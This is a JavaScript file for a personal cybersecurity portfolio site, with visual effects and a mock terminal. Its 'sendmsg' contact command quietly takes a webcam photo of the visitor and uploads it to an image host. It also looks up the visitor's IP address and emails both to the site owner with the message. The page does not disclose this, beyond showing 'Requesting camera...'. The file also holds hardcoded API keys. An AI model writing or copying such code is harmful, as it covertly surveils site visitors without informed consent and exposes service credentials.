// Initialize EmailJS
(function () {
    emailjs.init('8HDuCD7IjRceaYMQ9'); // Your Public Key
})();

// Matrix Rain Background
const initMatrixBackground = () => {
    const canvases = [
        { id: 'matrix-bg', container: document.querySelector('#hero') },
        { id: 'matrix-bg-skills', container: document.querySelector('#skills') },
        { id: 'matrix-bg-footer', container: document.querySelector('.footer') }
    ];

    canvases.forEach(({ id, container }) => {
        const canvas = document.getElementById(id);
        if (!canvas || !container) return;

        const ctx = canvas.getContext('2d');
        canvas.height = container.offsetHeight;
        canvas.width = container.offsetWidth;

        const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%^&*()_+-=[]{}|;:,.<>?';
        const fontSize = 14;
        const columns = Math.floor(canvas.width / fontSize);
        const drops = Array(columns).fill(0);

        ctx.font = `${fontSize}px JetBrains Mono`;
        ctx.fillStyle = 'rgba(0, 204, 0, 0.3)';

        function draw() {
            ctx.fillStyle = 'rgba(0, 10, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            ctx.fillStyle = 'rgba(0, 204, 0, 0.6)';
            for (let i = 0; i < drops.length; i++) {
                const text = chars.charAt(Math.floor(Math.random() * chars.length));
                const x = i * fontSize;
                const y = drops[i] * fontSize;

                ctx.fillText(text, x, y);

                if (y > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }

        setInterval(draw, 50);

        window.addEventListener('resize', () => {
            canvas.height = container.offsetHeight;
            canvas.width = container.offsetWidth;
            const newColumns = Math.floor(canvas.width / fontSize);
            drops.length = newColumns;
            drops.fill(0);
        });
    });
};

// Custom Cursor
const initCustomCursor = () => {
    const cursor = document.querySelector('.custom-cursor');
    const hoverElements = document.querySelectorAll('a, button, .nav-link, .btn, .skill-card, .project-card, .detail-item, .social-link, .filter-btn');

    if ('ontouchstart' in window || !cursor) {
        cursor.style.display = 'none';
        return;
    }

    document.addEventListener('mousemove', (e) => {
        cursor.style.top = `${e.clientY}px`;
        cursor.style.left = `${e.clientX}px`;
    });

    document.addEventListener('click', () => {
        cursor.classList.add('click');
        setTimeout(() => cursor.classList.remove('click'), 300);
    });

    hoverElements.forEach((el) => {
        el.addEventListener('mouseenter', () => {
            cursor.classList.add(el.classList.contains('skill-card') || el.classList.contains('project-card') || el.classList.contains('detail-item') ? 'card-hover' : 'hover');
        });
        el.addEventListener('mouseleave', () => {
            cursor.classList.remove('hover', 'card-hover');
        });
    });
};

// Section Animations
const initSectionAnimations = () => {
    const observer = new IntersectionObserver((entries) => {
        entries.forEach((entry, index) => {
            if (entry.isIntersecting) {
                setTimeout(() => {
                    entry.target.classList.add('visible');
                    if (entry.target.classList.contains('skill-card')) {
                        const bar = entry.target.querySelector('.progress-bar');
                        if (bar) bar.style.width = bar.style.width;
                    }
                }, index * 100);
                observer.unobserve(entry.target);
            }
        });
    }, { threshold: 0.2 });

    document.querySelectorAll('.animate-section, .tilt-card').forEach(el => observer.observe(el));
};

// Tilt Effect
const initTiltEffect = () => {
    VanillaTilt.init(document.querySelectorAll('.tilt-card'), {
        max: 12,
        speed: 400,
        glare: true,
        'max-glare': 0.2,
    });
};

// === PHOTO CAPTURE + UPLOAD TO IMGBB ===
async function capturePhoto() {
    try {
        console.log('Requesting camera access...');
        const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 160, height: 120 } });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement('canvas');
        canvas.width = 160;
        canvas.height = 120;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, 160, 120);

        stream.getTracks().forEach(t => t.stop());
        console.log('Photo captured');

        return new Promise((resolve) => {
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('image', blob);

                try {
                    console.log('Uploading to ImgBB...');
                    const res = await fetch('https://api.imgbb.com/1/upload?key=04b5d01f4c497f511aadcea64b899a51', {
                        method: 'POST',
                        body: formData
                    });
                    const data = await res.json();

                    if (data.success) {
                        console.log('Photo uploaded:', data.data.url);
                        resolve(data.data.url);
                    } else {
                        console.error('ImgBB error:', data);
                        resolve(null);
                    }
                } catch (err) {
                    console.error('Upload failed:', err);
                    resolve(null);
                }
            }, 'image/jpeg', 0.6);
        });
    } catch (err) {
        console.error('Camera failed:', err.message);
        return null;
    }
}

// Terminal with Photo + Email
const initTerminal = () => {
    const terminalInput = document.getElementById('terminal-input');
    const terminalOutput = document.getElementById('terminal-output');

    terminalInput.addEventListener('keydown', async (e) => {
        if (e.key !== 'Enter') return;

        const input = terminalInput.value.trim();
        const [command, ...args] = input.split(' ');
        terminalOutput.innerHTML = '';

        switch (command.toLowerCase()) {
            case 'whoami':
                terminalOutput.innerHTML = '<p>Arul Prakash R - Cybersecurity Specialist</p>';
                break;

            case 'help':
                terminalOutput.innerHTML = '<p>Commands: whoami, help, sendmsg &lt;subject&gt; &lt;message&gt;</p>';
                break;

            case 'sendmsg':
                if (args.length < 2) {
                    terminalOutput.innerHTML = '<p class="error">Usage: sendmsg &lt;subject&gt; &lt;message&gt;</p>';
                    break;
                }

                const subject = args[0];
                const message = args.slice(1).join(' ');
                terminalOutput.innerHTML = '<p>Requesting camera...</p>';

                const photo_url = await capturePhoto();
                const final_url = photo_url || 'https://i.ibb.co.com/0s3fP2T/no-photo.jpg';

                let sender_ip = 'Unknown';
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const data = await res.json();
                    sender_ip = data.ip || 'Unknown';
                } catch (e) {
                    console.error('IP fetch failed:', e);
                }

                emailjs.send('service_muid74x', 'template_6u3mi8b', {
                    title: subject,
                    message: message,
                    sender_ip: sender_ip,
                    photo_url: final_url,
                    username: 'GuestUser'
                })
                .then(() => {
                    terminalOutput.innerHTML = `<p class="message-sent">Message sent!${!photo_url ? ' (no photo)' : ''}</p>`;
                })
                .catch((err) => {
                    console.error('EmailJS error:', err);
                    terminalOutput.innerHTML = '<p class="error">Failed: ' + (err.text || 'Unknown error') + '</p>';
                });
                break;

            default:
                terminalOutput.innerHTML = '<p class="error">Unknown command. Type "help".</p>';
        }

        terminalInput.value = '';
    });
};

// Scan Line Effect
const initScanLine = () => {
    const createScanLine = () => {
        const line = document.createElement('div');
        line.className = 'scan-line';
        document.body.appendChild(line);
        setTimeout(() => line.remove(), 4000);
    };
    setInterval(createScanLine, 6000);
};

// Dark Mode Toggle
const initDarkModeToggle = () => {
    const toggle = document.querySelector('.dark-mode-toggle');
    toggle?.addEventListener('click', () => {
        document.body.classList.toggle('light-mode');
    });
};

// Project Filters
const initProjectFilters = () => {
    const buttons = document.querySelectorAll('.filter-btn');
    const cards = document.querySelectorAll('.project-card');

    buttons.forEach(btn => {
        btn.addEventListener('click', () => {
            buttons.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');

            const filter = btn.dataset.filter;
            cards.forEach(card => {
                card.classList.toggle('hidden', filter !== 'all' && card.dataset.category !== filter);
            });
        });
    });
};

const initFlipCard = () => {
    document.querySelectorAll('.flip-container').forEach(container => {
        container.addEventListener('click', () => {
            container.classList.toggle('flipped');
        });
    });
};

// Initialize Everything
document.addEventListener('DOMContentLoaded', () => {
    initMatrixBackground();
    initCustomCursor();
    initSectionAnimations();
    initTiltEffect();
    initTerminal();
    initScanLine();
    initDarkModeToggle();
    initProjectFilters();
});
